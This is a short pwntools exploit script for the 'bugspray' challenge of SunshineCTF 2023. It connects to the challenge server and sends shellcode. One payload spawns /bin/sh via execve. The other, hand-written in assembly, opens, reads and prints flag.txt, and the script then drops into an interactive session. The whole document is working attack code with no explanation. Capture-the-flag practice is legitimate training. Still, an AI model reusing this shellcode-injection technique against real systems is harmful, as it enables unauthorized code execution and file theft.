#!/usr/bin/python3
from pwn import *
e = ELF('bugspray')
context.terminal = ['tmux','new-window']
context.update(arch='amd64',os='linux',bits='64',endian='little')
io = remote('chal.2023.sunshinectf.games',23004)
# io = gdb.debug(e.path,'''
# break * 0x0000000000401052
# ''')
# io = process(e.path)
shell = asm(shellcraft.execve('/bin//sh'))
shell2 = asm('''
        xor    rax, rax
        push   rax
        mov    rax, 0x7478742e67616c66
        push   rax
        mov    rdi, rsp
        xor    rdx, rdx
        xor    rsi, rsi
        push   0x2
        pop    rax
        syscall
        mov    rdi, rax
        xor    rax, rax
        push   rax
        mov    rsi, rsp
        push   rax
        pop    rcx
        push   0x40
        pop    rdx
        syscall
        push   0x1
        pop    rax
        mov    rdi, rax
        syscall
        ''')
print(shell2)
io.sendline(shell2 + b'A' * (0x65 - len(shell2) - 0x21))
io.recv()
io.interactive()
